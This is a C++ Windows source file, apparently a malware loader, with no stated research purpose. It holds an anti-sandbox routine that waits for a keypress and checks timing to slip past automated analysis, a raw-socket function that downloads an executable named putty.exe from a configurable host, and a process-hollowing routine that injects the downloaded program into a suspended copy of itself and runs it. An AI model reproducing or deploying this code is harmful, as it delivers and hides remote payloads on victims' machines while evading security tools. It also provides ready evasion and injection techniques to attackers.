/*
Copyright (C) Anton Kling <anton@kling.gg>
This program is free software: you can redistribute it and/or modify it under the terms of the GNU General Public License as published by the Free Software Foundation, either version 3 of the License, or any later version.

This program is distributed in the hope that it will be useful, but WITHOUT ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the GNU General Public License for more details.

You should have received a copy of the GNU General Public License along with this program. If not, see <https://www.gnu.org/licenses/>. 
*/
#include <fcntl.h>
#include <io.h>
#include <iostream>
#include <sys/stat.h>
#include <sys/types.h>
#include "rawdata.h"
#include <tchar.h>
#include <time.h>
#include <windows.h>
#include <TlHelp32.h>

#define DEBUG_FATAL_ERROR(function_name)                                       \
  {                                                                            \
    LPVOID lpMsgBuf;                                                           \
    DWORD dw = GetLastError();                                                 \
    FormatMessage(FORMAT_MESSAGE_ALLOCATE_BUFFER |                             \
                      FORMAT_MESSAGE_FROM_SYSTEM |                             \
                      FORMAT_MESSAGE_IGNORE_INSERTS,                           \
                  NULL, dw, MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),         \
                  (LPTSTR)&lpMsgBuf, 0, NULL);                                 \
    std::cout << "Program failed at " << function_name                         \
              << " with error: " << lpMsgBuf << "(" << dw << ")" << std::endl; \
    exit(1);                                                                   \
  }

#pragma comment(lib, "ws2_32.lib")

inline void anti_sandbox_vm(void) {
  // This attempts to avoid automatic
  // runtime protection by only executing
  // the code should ALT be pressed by
  // the user. It also checks that
  // not all GetAsyncKeyState calls
  // are skipped by creating a time
  // limit.
  int time = clock();
  for (;!GetAsyncKeyState(164););
  if (clock() - time < 50)
    exit(1);
  return;
}

void run_pe(unsigned char *pe) {
  DWORD64 *image_base;
  PVOID image_base_pointer;
  CONTEXT CTX;
  IMAGE_NT_HEADERS *nt_header;
  PROCESS_INFORMATION process_information;
  STARTUPINFOA startup_information;
  char filename[1024];

  memset(&process_information, 0, sizeof(process_information));
  memset(&startup_information, 0, sizeof(startup_information));

  IMAGE_DOS_HEADER *dos_header = (PIMAGE_DOS_HEADER)pe;
  nt_header = (PIMAGE_NT_HEADERS)(pe + dos_header->e_lfanew);

  if (IMAGE_NT_SIGNATURE != nt_header->Signature)
    return; // NT signature is incorrect

  // Create a new supsended process from the current one
  GetModuleFileNameA(0, filename, sizeof(filename));
  if (!CreateProcessA(filename, NULL, NULL, NULL, FALSE, CREATE_SUSPENDED, NULL,
                      NULL, &startup_information, &process_information))
    DEBUG_FATAL_ERROR("CreateProcessA");

  CTX.ContextFlags = CONTEXT_FULL;

  if (!GetThreadContext(process_information.hThread, (LPCONTEXT)&CTX))
    DEBUG_FATAL_ERROR("GetThreadContext");

  ReadProcessMemory(process_information.hProcess, (LPCVOID)(CTX.Ebx + 8),
                    &image_base, sizeof(image_base), 0);

  if (NULL == (image_base_pointer = VirtualAllocEx(
                   process_information.hProcess,
                   (LPVOID)nt_header->OptionalHeader.ImageBase,
                   nt_header->OptionalHeader.SizeOfImage,
                   MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE)))
    DEBUG_FATAL_ERROR("VirtualAllocEx");

  WriteProcessMemory(process_information.hProcess, image_base_pointer, pe,
                     nt_header->OptionalHeader.SizeOfHeaders, NULL);

  for (int i = 0; i < nt_header->FileHeader.NumberOfSections; i++) {
    IMAGE_SECTION_HEADER *section_header =
        (PIMAGE_SECTION_HEADER)(pe + dos_header->e_lfanew +
                                sizeof(IMAGE_NT_HEADERS32) +
                                i * sizeof(IMAGE_SECTION_HEADER));

    WriteProcessMemory(
        process_information.hProcess,
        (LPVOID)((DWORD)image_base_pointer + section_header->VirtualAddress),
        (LPVOID)(DWORD(pe) + section_header->PointerToRawData),
        section_header->SizeOfRawData, 0);
  }

  WriteProcessMemory(process_information.hProcess, (LPVOID)(CTX.Ebx + 8),
                     (LPVOID)&nt_header->OptionalHeader.ImageBase,
                     sizeof(DWORD), 0);

  CTX.Eax =
      (DWORD)image_base_pointer + nt_header->OptionalHeader.AddressOfEntryPoint;
  SetThreadContext(process_information.hThread, &CTX);
  ResumeThread(process_information.hThread);
}

unsigned long download_file(unsigned char **file) {
  WSADATA wsaData;
  if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0)
    return 0;

  SOCKET Socket = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
  struct hostent *host;
  host = gethostbyname("127.0.0.1");
  SOCKADDR_IN SockAddr;
  SockAddr.sin_port = htons(80);
  SockAddr.sin_family = AF_INET;
  SockAddr.sin_addr.s_addr = *((unsigned long *)host->h_addr);
  if (connect(Socket, (SOCKADDR *)(&SockAddr), sizeof(SockAddr)) != 0)
    return 0;

  std::string header = "GET /putty.exe HTTP/1.0\r\n\r\n";
  send(Socket, header.c_str(), header.length(), 0);

  char buffer[1000];
  int nDataLength;
  unsigned long length = 0;
  nDataLength = recv(Socket, buffer, 1000, 0);
  int i = 4;
  for (;strncmp(buffer + i, "\r\n\r\n", 4); i++);
  length += nDataLength - i - 4;

  *file = (unsigned char *)malloc(length);
  memcpy(*file, buffer + i + 4, nDataLength - i - 4);
  for (;(nDataLength = recv(Socket, buffer, 1000, 0)) > 0;) {
    if (NULL == (*file = (unsigned char *)realloc(*file, length + nDataLength))) {
      length = 0;
      break;
    }

    memcpy(*file + length, buffer, nDataLength);
    length += nDataLength;
  }

  closesocket(Socket);
  WSACleanup();
  return length;
}

int main(void) {
  unsigned char *file;
  unsigned long size;
  anti_sandbox_vm();
  if (0 == (size = download_file(&file)))
    return 1;

  run_pe(file);
  free(file);
  return 0;
}
